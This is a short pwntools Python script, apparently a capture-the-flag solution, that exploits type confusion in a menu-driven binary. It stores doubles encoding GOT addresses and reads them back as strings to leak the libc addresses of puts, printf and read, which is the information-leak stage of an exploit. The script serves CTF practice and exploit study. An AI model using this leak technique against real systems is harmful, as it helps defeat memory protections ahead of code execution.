from pwn import *

R = process('./chall')
#R = remote("13.231.207.73", 9007)

def to_lf(x):
    return str(struct.unpack("d",struct.pack("q",x))[0])

def add(r, t, v):
    r.sendlineafter("> ", "1")
    r.sendlineafter("Type(long=1/double=2/str=3):", str(t))
    r.sendlineafter("Data:", v)

def get(r, i, t):
    r.sendlineafter("> ", "2")
    r.sendlineafter("Index:", str(i))
    r.sendlineafter("Type(long=1/double=2/str=3):", str(t))
    r.recvuntil("Data: ")
    return r.recvline()[:-1]

def edit(r, i, t, v):
    r.sendlineafter("> ", "3")
    r.sendlineafter("Index:", str(i))
    r.sendlineafter("Type(long=1/double=2/str=3):", str(t))
    r.sendlineafter("Data:", v)

def del_(r, i):
    r.sendlineafter("> ", "4")
    r.sendlineafter("Index:", str(i))

def main(r):
    # leak puts
    add(r, 2, to_lf(0x602018))
    puts = u64(get(r, 0, 3).ljust(8, b'\x00'))
    # leak printf
    add(r, 2, to_lf(0x602050))
    printf = u64(get(r, 1, 3).ljust(8, b'\x00'))
    # leak read
    add(r, 2, to_lf(0x602058))
    read = u64(get(r, 2, 3).ljust(8, b'\x00'))

    log.info("read - puts: " + hex(read-puts))
    log.info("puts - printf: "+hex(puts-printf))
 

if __name__ == '__main__':
    main(R)
